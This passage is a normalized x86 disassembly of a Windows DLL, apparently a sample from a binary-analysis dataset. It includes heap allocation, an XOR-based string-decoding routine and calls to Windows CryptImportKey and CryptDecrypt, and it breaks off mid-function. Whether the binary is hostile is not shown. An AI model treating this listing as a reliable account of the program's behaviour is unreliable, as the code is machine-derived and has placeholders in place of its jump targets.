sub_10001000
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x20 ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x24 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x28 ]
mov [ ecx + 0xc ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x10 ] eax
pop ebp
retn
sub_10001023
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1005b670
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_1004b131
mov eax esi
sub_10001098
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10001122
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_10032181
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_10032181
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_10032181
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_10032181
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_10032181
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
push 0x2
cmp eax ebx
mov [ ebp - 0x4 ] eax
pop ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] ebx
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0xc ]
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ebx [ ebp - 0xc ]
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1003a496
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1003a496
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
cmp [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
mov ebx [ ebp - 0x8 ]
cmp [ ebp + 0x12 ] bx
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1003a496
or [ esi ] eax
add esp 0x18
dec [ ebx ]
mov ebx [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1003a496
add esp 0x18
or [ esi ] eax
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
movzx ecx [ ebp + 0x12 ]
movzx eax bx
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1003a496
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1003a496
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
sub_100015fc
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x18 ]
movzx eax ax
retn
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_10001620
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xff9a
and esi 0xff
mov [ ebp + eax * 2 - 0xa8 ] si
inc eax
cmp eax 0x24
jb r-xdata
mov edx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] ax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xfff7
and esi 0xff
mov [ ebp + eax * 2 - 0x58 ] si
inc eax
cmp eax 0x24
jb r-xdata
xor edx edx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] dx
push eax
lea edx [ ebp - 0xa8 ]
call sub_10025b90
mov ecx [ ebp - 0x4 ]
add esp 0x4
neg eax
sbb eax eax
xor ecx ebp
neg eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_100016d1
push 0x3c
mov eax sub_10085747
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006b26d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001927f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_100017a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a22c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x178
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov esi edx
cmp [ esi + 0x8 ] 0x0
mov [ ebp - 0x184 ] eax
mov [ ebp - 0x180 ] ecx
jne r-xdata
push ebx
call sub_1005ae90
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
xor edx edx
mov [ ebp - 0x130 ] 0x7
mov [ ebp - 0x134 ] 0x0
mov [ ebp - 0x144 ] dx
lea edx [ ebp - 0x144 ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call sub_10028620
test eax eax
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax 0xa1
call sub_10069020
push edx
lea eax [ ebp - 0x160 ]
lea ebx [ esi + 0xc ]
push eax
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xd
mov [ ebp - 0x4 ] 0x0
call sub_10022b50
cmp [ ebp - 0x14c ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x184 ]
push ecx
mov ecx [ ebp - 0x180 ]
push edi
lea edx [ ebp - 0x144 ]
call sub_10008d50
test eax eax
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x120
call sub_10069020
mov eax edx
push eax
lea ecx [ ebp - 0x160 ]
lea ebx [ esi + 0xc ]
push ecx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xd
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x14c ] esi
jb r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x160 ]
push ecx
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x144 ]
call sub_100702e0
xor eax eax
lea edx [ ebp - 0x98 ]
mov eax 0xa8
call sub_10069020
push edx
lea eax [ ebp - 0x17c ]
lea ebx [ esi + 0xc ]
push eax
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xd
mov [ ebp - 0x4 ] 0x3
call sub_10022b50
lea ecx [ ebp - 0x17c ]
call sub_100702e0
lea ecx [ ebp - 0x144 ]
call sub_100702e0
mov eax 0x4
jmp r-xdata
cmp [ ebp - 0x130 ] esi
jb r-xdata
mov edx [ ebp - 0x160 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax 0x3
jmp r-xdata
mov eax [ ebp - 0x144 ]
push eax
call sub_1000a86e
add esp 0x4
sub_10001990
push ebp
mov ebp esp
push 0xffffffff
push sub_100868eb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea edi [ ecx + 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ecx + edi - 0x60 ] r--data
lea ecx [ edi - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_10063b90
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi - 0x60 ]
mov eax [ edx + 0x4 ]
mov [ eax + edi - 0x60 ] r--data
mov ecx [ edi - 0x50 ]
mov edx [ ecx + 0x4 ]
mov [ edx + edi - 0x50 ] r--data
mov eax [ edi - 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + edi - 0x60 ] r--data
push edi
mov [ edi ] r--data
call sub_10027450
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10001a30
push ebp
mov ebp esp
push 0xffffffff
push sub_100867b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_10041330
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x62
call sub_1002f620
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10001b6d
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100064b9
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_10001ba0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi [ edi ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
cmp eax ebx
jne r-xdata
cmp [ esi + 0x4 ] ebx
je r-xdata
mov edi eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov edi eax
mov [ esi + 0x4 ] eax
cmp edi ebx
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] ebx
jne r-xdata
xor esi esi
mov ecx [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
call sub_1002b2e0
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] ebx
mov [ esi ] r--data
mov ecx [ eax + 0xc ]
mov [ esi + 0xc ] ecx
jmp r-xdata
push 0x10
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
mov [ edi + 0x4 ] ebx
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ edi ] esi
cmp esi ebx
je r-xdata
sub_10001c4c
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_1002d269
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_1007fa40
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_1000c735
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_1007fbc0
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_1001c5d7
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_1007fbc0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_1001e3ae
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_1007f580
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_1007f580
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_10049cc0
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
call sub_1005aa2b
sub_10001e6d
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
xor edi edi
push edi
xor esi esi
inc esi
push esi
push r--data
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push [ eax ]
push edi
push esi
mov esi [ CryptDecrypt@IAT ]
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
call sub_10020fb2
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
pop esi
leave
retn 0x10
mov eax esi
cmp eax edi
je r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop ebx
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebx ]
push [ ebp + 0x8 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push ebx
push [ eax ]
push edi
push 0x1
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_10001f5d
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004728e
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10002016
push 0x20
push r--data
call sub_1007fad0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1000c429
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
